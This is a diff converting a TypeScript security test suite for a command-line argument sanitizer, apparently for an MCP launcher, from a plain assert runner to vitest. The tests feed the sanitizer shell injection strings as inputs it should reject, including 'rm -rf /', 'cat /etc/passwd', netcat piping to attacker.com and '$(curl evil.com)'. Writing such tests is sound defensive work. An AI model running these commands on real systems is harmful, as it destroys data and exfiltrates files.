@@ -1,133 +1,135 @@
-#!/usr/bin/env tsx
-
-import assert from 'node:assert'
+import { describe, expect, it } from 'vitest'
 import { sanitizeCommandLineArgs } from './security-utils.ts'
 
-// Test runner
-function runTests() {
-  console.log('🧪 Running MCP Launcher Security Tests...\n')
+describe('MCP Launcher Security', () => {
+  describe('sanitizeCommandLineArgs', () => {
+    it('should allow safe arguments', () => {
+      // Arrange
+      const safeArgs = [
+        '--port=3000',
+        '--host=localhost',
+        '--debug',
+        'config.json',
+        '/path/to/file.ts',
+        'module-name',
+        'value123',
+        'snake_case_value',
+        'kebab-case-value',
+      ]
 
-  // Test: should allow safe arguments
-  {
-    const safeArgs = [
-      '--port=3000',
-      '--host=localhost',
-      '--debug',
-      'config.json',
-      '/path/to/file.ts',
-      'module-name',
-      'value123',
-      'snake_case_value',
-      'kebab-case-value',
-    ]
+      // Act
+      const result = sanitizeCommandLineArgs(safeArgs)
 
-    const result = sanitizeCommandLineArgs(safeArgs)
-    assert.deepStrictEqual(result, safeArgs, 'Should allow safe arguments')
-    console.log('✅ Safe arguments test passed')
-  }
+      // Assert
+      expect(result).toEqual(safeArgs)
+    })
 
-  // Test: should reject shell injection attempts
-  {
-    const maliciousArgs = [
-      '--port=3000; rm -rf /',
-      '--host=`whoami`',
-      '--debug && cat /etc/passwd',
-      'config.json | nc attacker.com 1234',
-      '$(curl evil.com)',
-      '--value=${HOME}',
-      'arg > /dev/null',
-      'arg < input.txt',
-      'arg1 || arg2',
-      'arg1 && arg2',
-    ]
+    it('should reject shell injection attempts', () => {
+      // Arrange
+      const maliciousArgs = [
+        '--port=3000; rm -rf /',
+        '--host=`whoami`',
+        '--debug && cat /etc/passwd',
+        'config.json | nc attacker.com 1234',
+        '$(curl evil.com)',
+        '--value=${HOME}',
+        'arg > /dev/null',
+        'arg < input.txt',
+        'arg1 || arg2',
+        'arg1 && arg2',
+      ]
 
-    const result = sanitizeCommandLineArgs(maliciousArgs)
-    assert.deepStrictEqual(result, [], 'Should reject all malicious arguments')
-    console.log('✅ Shell injection rejection test passed')
-  }
+      // Act
+      const result = sanitizeCommandLineArgs(maliciousArgs)
 
-  // Test: should reject arguments with spaces and special characters
-  {
-    const unsafeArgs = [
-      'arg with spaces',
-      'arg\twith\ttabs',
-      'arg\nwith\nnewlines',
-      'arg"with"quotes',
-      "arg'with'quotes",
-      'arg\\with\\backslashes',
-      'arg*with*wildcards',
-      'arg?with?wildcards',
-      'arg(with)parentheses',
-      'arg[with]brackets',
-      'arg{with}braces',
-    ]
+      // Assert
+      expect(result).toEqual([])
+    })
 
-    const result = sanitizeCommandLineArgs(unsafeArgs)
-    assert.deepStrictEqual(result, [], 'Should reject all unsafe arguments')
-    console.log('✅ Special characters rejection test passed')
-  }
+    it('should reject arguments with spaces and special characters', () => {
+      // Arrange
+      const unsafeArgs = [
+        'arg with spaces',
+        'arg\twith\ttabs',
+        'arg\nwith\nnewlines',
+        'arg"with"quotes',
+        "arg'with'quotes",
+        'arg\\with\\backslashes',
+        'arg*with*wildcards',
+        'arg?with?wildcards',
+        'arg(with)parentheses',
+        'arg[with]brackets',
+        'arg{with}braces',
+      ]
 
-  // Test: should reject empty arguments
-  {
-    const args = ['valid-arg', '', 'another-valid-arg']
-    const result = sanitizeCommandLineArgs(args)
-    assert.deepStrictEqual(
-      result,
-      ['valid-arg', 'another-valid-arg'],
-      'Should filter out empty arguments'
-    )
-    console.log('✅ Empty arguments filtering test passed')
-  }
+      // Act
+      const result = sanitizeCommandLineArgs(unsafeArgs)
 
-  // Test: should reject oversized arguments
-  {
-    const longArg = 'a'.repeat(1000)
-    const args = ['valid-arg', longArg, 'another-valid-arg']
+      // Assert
+      expect(result).toEqual([])
+    })
 
-    const result = sanitizeCommandLineArgs(args)
-    assert.deepStrictEqual(
-      result,
-      ['valid-arg', 'another-valid-arg'],
-      'Should filter out oversized arguments'
-    )
-    console.log('✅ Oversized arguments filtering test passed')
-  }
+    it('should reject empty arguments', () => {
+      // Arrange
+      const args = ['valid-arg', '', 'another-valid-arg']
 
-  // Test: should limit total number of arguments
-  {
-    const manyArgs = Array(100).fill('valid-arg')
-    const result = sanitizeCommandLineArgs(manyArgs)
-    assert(result.length <= 50, 'Should limit to maximum 50 arguments')
-    console.log('✅ Argument count limiting test passed')
-  }
+      // Act
+      const result = sanitizeCommandLineArgs(args)
 
-  // Test: should reject non-string arguments
-  {
-    const mixedArgs = [
-      'valid-string',
-      123 as any,
-      { object: 'value' } as any,
-      null as any,
-      undefined as any,
-      'another-valid-string',
-    ]
+      // Assert
+      expect(result).toEqual(['valid-arg', 'another-valid-arg'])
+    })
 
-    const result = sanitizeCommandLineArgs(mixedArgs)
-    assert.deepStrictEqual(
-      result,
-      ['valid-string', 'another-valid-string'],
-      'Should filter out non-string arguments'
-    )
-    console.log('✅ Non-string arguments filtering test passed')
-  }
-  // Test with empty array
-  assert.deepStrictEqual(sanitizeCommandLineArgs([]), [], 'Should handle empty array')
-  console.log('✅ Edge cases test passed')
+    it('should reject oversized arguments', () => {
+      // Arrange
+      const longArg = 'a'.repeat(1000)
+      const args = ['valid-arg', longArg, 'another-valid-arg']
 
-  console.log('\n🎉 All security tests passed!')
-}
+      // Act
+      const result = sanitizeCommandLineArgs(args)
 
-// Run tests if this file is executed directly
-if (import.meta.url === `file://${process.argv[1]}`) {
-  runTests()
-}
+      // Assert
+      expect(result).toEqual(['valid-arg', 'another-valid-arg'])
+    })
+
+    it('should limit total number of arguments', () => {
+      // Arrange
+      const manyArgs = Array(100).fill('valid-arg')
+
+      // Act
+      const result = sanitizeCommandLineArgs(manyArgs)
+
+      // Assert
+      expect(result.length).toBeLessThanOrEqual(50)
+    })
+
+    it('should reject non-string arguments', () => {
+      // Arrange
+      const mixedArgs = [
+        'valid-string',
+        123 as any,
+        { object: 'value' } as any,
+        null as any,
+        undefined as any,
+        'another-valid-string',
+      ]
+
+      // Act
+      const result = sanitizeCommandLineArgs(mixedArgs)
+
+      // Assert
+      expect(result).toEqual(['valid-string', 'another-valid-string'])
+    })
+
+    it('should handle empty array', () => {
+      // Arrange
+      const args: string[] = []
+
+      // Act
+      const result = sanitizeCommandLineArgs(args)
+
+      // Assert
+      expect(result).toEqual([])
+    })
+  })
+})
